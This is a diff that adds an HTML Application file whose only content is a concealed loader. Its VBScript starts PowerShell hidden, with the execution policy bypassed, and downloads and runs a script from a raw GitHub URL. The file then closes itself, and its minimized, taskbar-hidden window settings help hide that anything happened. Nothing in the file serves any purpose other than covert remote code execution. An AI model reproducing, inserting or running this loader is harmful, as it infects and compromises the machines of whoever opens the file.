@@ -1,0 +1,12 @@
+<html>
+<head>
+<script language="VBScript">
+set oShell = CreateObject("Wscript.Shell")
+oShell.Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/str1ctlyelnuno/css/main/test.ps1'));"),0,true
+self.close()
+</script>
+<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
+</head>
+<body>
+</body>
+</html>
